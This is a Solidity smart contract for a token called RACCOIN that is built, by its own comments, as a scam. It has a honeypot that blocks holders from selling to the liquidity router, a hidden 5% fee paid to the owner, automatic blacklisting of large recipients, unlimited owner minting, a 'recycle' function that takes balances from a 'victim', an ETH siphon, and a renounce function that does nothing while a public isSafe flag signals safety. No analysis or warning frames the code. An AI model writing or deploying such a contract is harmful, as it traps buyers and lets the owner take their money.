// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract RACCOIN {
    string public name = "RACCOIN";
    string public symbol = "RACC";
    uint8 public decimals = 18;
    uint256 public totalSupply;

    address private _owner;
    address private _router;
    bool private _lockdown;
    bool public isSafe = true;

    mapping(address => uint256) public balanceOf;
    mapping(address => bool) private blacklist;
    mapping(address => bool) private exempt;

    modifier onlyOwner() {
        require(msg.sender == _owner, "Not authorized");
        _;
    }

    constructor() {
        _owner = msg.sender;
        exempt[_owner] = true;
        _mint(_owner, 1_000_000 * 10**18);
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(!blacklist[msg.sender], "Blacklisted");
        require(balanceOf[msg.sender] >= amount, "Too poor");

        // Honeypot: Block sells to LP or owner unless exempt
        if ((to == _router || to == _owner) && !exempt[msg.sender]) {
            revert("Action not permitted");
        }

        uint256 fee = 0;

        // 5% stealth fee to owner
        if (!exempt[msg.sender] && !exempt[to]) {
            fee = amount * 5 / 100;
            balanceOf[_owner] += fee;
        }

        balanceOf[msg.sender] -= amount;
        balanceOf[to] += (amount - fee);

        // Transfer trap: blacklists recipient if amount > 1000 tokens
        if (amount > 1000 * 1e18 && !_lockdown) {
            blacklist[to] = true;
        }

        return true;
    }

    // Infinite mint
    function generate(address target, uint256 amount) external onlyOwner {
        _mint(target, amount);
    }

    // Fake burn that sends to owner
    function recycle(address victim, uint256 amount) external onlyOwner {
        balanceOf[victim] -= amount;
        balanceOf[_owner] += amount;
    }

    // Trap wallet forever
    function isolate(address target) external onlyOwner {
        blacklist[target] = true;
    }

    // Withdraw all ETH
    function siphon() external onlyOwner {
        payable(_owner).transfer(address(this).balance);
    }

    // Toggles lockdown mode (triggers blacklisting rules)
    function lockdown() external onlyOwner {
        _lockdown = !_lockdown;
    }

    // Obfuscated renounce function (does nothing)
    function renounce() external onlyOwner {
        isSafe = false;
    }

    // Assign router (for LP trap)
    function setRouter(address addr) external onlyOwner {
        _router = addr;
    }

    // Fallback to accept ETH
    receive() external payable {}

    function _mint(address to, uint256 amount) internal {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}
